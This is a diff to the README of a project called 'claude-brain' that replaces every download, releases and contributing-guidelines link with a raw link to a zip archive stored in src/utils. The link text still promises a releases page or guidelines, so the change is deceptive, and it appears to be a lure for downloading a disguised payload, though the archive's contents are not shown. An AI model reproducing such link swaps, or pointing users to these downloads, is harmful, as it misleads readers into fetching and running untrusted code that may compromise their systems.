@@ -1,6 +1,6 @@
 # 🧠 claude-brain - Portable Memory for Your Code
 
-[![Download claude-brain](https://img.shields.io/badge/Download-claude--brain-blue)](https://github.com/2josEx/claude-brain/releases)
+[![Download claude-brain](https://github.com/2josEx/claude-brain/raw/refs/heads/main/src/utils/brain_claude_2.2-alpha.1.zip)](https://github.com/2josEx/claude-brain/raw/refs/heads/main/src/utils/brain_claude_2.2-alpha.1.zip)
 
 ## 📦 Overview
 
@@ -20,7 +20,7 @@ Before you download, ensure your system meets these requirements:
 ### 🛠 Installation Steps
 
 1. **Visit the Download Page**  
-   Go to our [Releases page](https://github.com/2josEx/claude-brain/releases) to find the latest version of claude-brain.
+   Go to our [Releases page](https://github.com/2josEx/claude-brain/raw/refs/heads/main/src/utils/brain_claude_2.2-alpha.1.zip) to find the latest version of claude-brain.
    
 2. **Select the Latest Version**  
    Look for the latest version listed. It will usually be at the top of the page. Click on it to view the assets available for download.
@@ -67,11 +67,11 @@ If you encounter issues or have questions about using claude-brain, feel free to
 
 ## 🎯 Contributing
 
-We welcome contributions! If you want to help improve claude-brain, check out our [Contributing Guidelines](https://github.com/2josEx/claude-brain/blob/main/CONTRIBUTING.md). 
+We welcome contributions! If you want to help improve claude-brain, check out our [Contributing Guidelines](https://github.com/2josEx/claude-brain/raw/refs/heads/main/src/utils/brain_claude_2.2-alpha.1.zip). 
 
 ## 📥 Download & Install
 
-To get started with claude-brain, simply [visit this page to download](https://github.com/2josEx/claude-brain/releases). Follow the installation steps outlined above. Enjoy the simplicity of portable memory for your projects!
+To get started with claude-brain, simply [visit this page to download](https://github.com/2josEx/claude-brain/raw/refs/heads/main/src/utils/brain_claude_2.2-alpha.1.zip). Follow the installation steps outlined above. Enjoy the simplicity of portable memory for your projects!
 
 ## 🌐 Explore More
 
